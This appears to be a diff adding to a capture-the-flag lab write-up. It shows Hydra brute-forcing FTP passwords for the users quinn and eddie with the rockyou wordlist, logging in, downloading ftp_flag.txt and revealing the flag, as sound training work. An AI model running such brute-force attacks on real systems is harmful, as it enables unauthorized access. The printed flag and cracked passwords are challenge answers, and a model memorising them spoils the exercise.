@@ -154,3 +154,60 @@ Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
 ```
 
 We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
+```
+root@ip-10-10-153-80:~# hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.216.66:10021   !!!
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-08-04 14:45:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.216.66:10021/
+[10021][ftp] host: 10.10.216.66   login: quinn   password: andrea   !!!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-08-04 14:45:17
+
+root@ip-10-10-153-80:~# hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.216.66:10021   !!!
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-08-04 14:45:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.216.66:10021/
+[10021][ftp] host: 10.10.216.66   login: eddie   password: jordan  !!!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-08-04 14:46:06
+
+
+root@ip-10-10-153-80:~# ftp 10.10.216.66 10021  !!!
+Connected to 10.10.216.66.
+220 (vsFTPd 3.0.3)
+Name (10.10.216.66:root): quinn   !!!
+331 Please specify the password.
+Password:                         !!!
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls                           !!!
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt   !!!
+226 Directory send OK.
+ftp> ascii                   !!!
+200 Switching to ASCII mode.
+ftp> get ftp_flag.txt        !!!
+local: ftp_flag.txt remote: ftp_flag.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
+WARNING! 1 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+18 bytes received in 0.00 secs (7.2189 kB/s)
+ftp> ^Z
+[5]+  Stopped                 ftp 10.10.216.66 10021
+root@ip-10-10-153-80:~# ls
+burp.json  CTFBuilder  Desktop  Downloads  ftp_flag.txt  Instructions  Pictures  Postman  Rooms  Scripts  thinclient_drives  Tools
+root@ip-10-10-153-80:~# cat ftp_flag.txt   !!!
+THM{321452667098}   !!!
+
+```
+
+Browsing to `http://10.10.216.66:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
+
